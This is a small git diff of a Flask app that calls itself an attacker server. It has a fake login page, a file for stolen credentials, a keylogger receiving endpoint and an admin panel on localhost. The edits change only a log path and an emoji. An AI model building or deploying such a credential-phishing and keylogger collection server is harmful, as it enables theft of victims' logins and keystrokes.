@@ -10,7 +10,7 @@ app.secret_key = 'evil_attacker_key'
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 STOLEN_DATA_FILE = os.path.join(BASE_DIR, 'stolen_credentials.txt')
-KEYLOGGER_FILE = os.path.join(BASE_DIR, 'keylogger', 'stolen_keys.log')
+KEYLOGGER_FILE = os.path.join(BASE_DIR,'stolen_keys.log')
 
 # 確保目錄存在
 os.makedirs(os.path.join(BASE_DIR, 'keylogger'), exist_ok=True)
@@ -302,7 +302,7 @@ def clear_logs():
     return '<h1 style="color: red;">所有記錄已清空!</h1><a href="/admin" style="color: lime;">返回控制面板</a>'
 
 if __name__ == "__main__":
-    print("🏴‍☠️ 攻擊者伺服器啟動中...")
+    print("🏴☠ 攻擊者伺服器啟動中...")
     print("偽造登入頁面: http://127.0.0.1:8888/login")
     print("控制面板: http://127.0.0.1:8888/admin")
     print("Keylogger 接收: http://127.0.0.1:8888/keylogger")
